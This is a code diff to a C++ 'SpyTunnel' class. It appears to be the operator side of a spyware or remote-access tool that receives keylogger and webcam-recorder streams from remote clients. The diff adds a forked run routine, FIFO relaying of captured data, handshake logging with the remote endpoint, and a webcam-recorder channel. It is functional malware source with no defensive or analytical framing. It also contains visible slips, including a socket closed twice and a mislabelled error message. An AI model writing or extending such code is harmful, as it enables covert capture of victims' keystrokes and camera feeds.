@@ -37,6 +37,42 @@ int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutd
     return 0;
 }
 
+void SpyTunnel::run() {
+    pid_ = fork();
+    if (pid_ < 0) {
+        write_fifo_error("[WebcamRecorder::run] Unable to fork a child process");
+    } else if (pid_ == 0) {
+        if (tunnel_socket_ != -1) {
+            close(tunnel_socket_);
+        }
+        if (tunnel_end_socket_ != -1) {
+            close(tunnel_socket_);
+        }
+        
+        spawn_window();
+        _exit(EXIT_FAILURE);
+    } 
+
+    int tries = 0;
+    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
+        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    }
+
+    if (tunnel_fifo_ == -1) {
+        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
+        return;
+    }
+
+    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
+    if (tunnel_shutdown_fd_.fd == -1) {
+        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
+        return;
+    }
+
+    exec_spy();
+}
+
 int SpyTunnel::udp_handshake(void* __arg, int __len) {
     ScopedEpollFD epoll_fd;
     int rc = create_epoll_fd(epoll_fd);
@@ -55,6 +91,7 @@ int SpyTunnel::udp_handshake(void* __arg, int __len) {
     memset(&tunnel_end_addr_, 0, sizeof(tunnel_end_addr_));
     tunnel_end_addr_len_ = sizeof(tunnel_end_addr_);
     rc = recvfrom(tunnel_socket_, &handshake, sizeof(Status), 0, (sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
+    std::cout << MAGENTA << "[SpyTunnel::udp_handshake] Received hello " << handshake << RESET;
     if (rc < 0) {
         return -1;
     } else if (rc == 0) {
@@ -66,13 +103,11 @@ int SpyTunnel::udp_handshake(void* __arg, int __len) {
     // Send the device num and make sure it is received by the other side
     while (true) {
         sendto(tunnel_socket_, __arg, __len, 0, (sockaddr*) &tunnel_end_addr_, tunnel_end_addr_len_);
+        std::cout << MAGENTA << "[SpyTunnel::udp_handshake] Sent: " << *static_cast<uint32_t*>(__arg) << " on port:" << ntohs(tunnel_end_addr_.sin_port) << RESET;
        
         int nfds = epoll_wait(epoll_fd.fd, events, 1, 5000);
         if (nfds < 0) {
             return -1;
-        } else if (nfds == 0) {
-            // Timeout occurred resemd the handshake
-            continue;
         }
 
         for (int i=0;i<nfds;i++) {
@@ -83,6 +118,7 @@ int SpyTunnel::udp_handshake(void* __arg, int __len) {
                 return -1;
             } else if (events[i].data.fd == tunnel_socket_) {
                 rc = recvfrom(tunnel_socket_, &handshake, sizeof(Status), 0, (sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
+                std::cout << MAGENTA << "[SpyTunnel::udp_handshake] received handshake " << handshake << RESET;
                 if (rc < 0) {
                     return -1;
                 } else if (rc == 0) {
@@ -111,6 +147,7 @@ int SpyTunnel::accept_tunnel_end() {
     ScopedEpollFD accept_epoll_fd;
     int rc = create_epoll_fd(accept_epoll_fd);
     if (rc < 0) {
+        write_fifo_error("[SpyTunnel::accept_tunnel_end] Error creating epoll" + std::string(strerror(errno)));
         return -1;
     }
 
@@ -181,6 +218,8 @@ int SpyTunnel::create_epoll_fd(ScopedEpollFD& __epoll_fd) {
 void SpyTunnel::edit_fifo_path(int __client_index, CommandCode __command_code) {
     if (__command_code == KEYLOGGER) {
         fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
+    } else if (__command_code == WEBCAM_RECORDER) {
+        fifo_path_ = WEBCAM_RECORDER_FIFO_PATH + std::to_string(__client_index);
     }
 }
 
@@ -226,13 +265,13 @@ void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, Command
         [=](Tunnel* tunnel) {
             bool should_erase = (tunnel->client_index_ == __client_index && tunnel->command_code_ == __command_code); 
             if (should_erase) {
+                std::cout << MAGENTA << "[erase_tunnel] Erasing tunnel with client_index_:command_code " << tunnel->client_index_ << " : " << tunnel->command_code_ << RESET;
                 delete tunnel->p_spy_tunnel_;
                 delete tunnel;
             }
             return should_erase;
         }
     );
-
     __p_tunnels->erase(it, __p_tunnels->end()); // Reorganize the vector
 }
 
@@ -240,7 +279,7 @@ void SpyTunnel::spawn_window() {
     // Overridden
 }
 
-void SpyTunnel::run() {
+void SpyTunnel::exec_spy() {
     // Overridden
 }
 
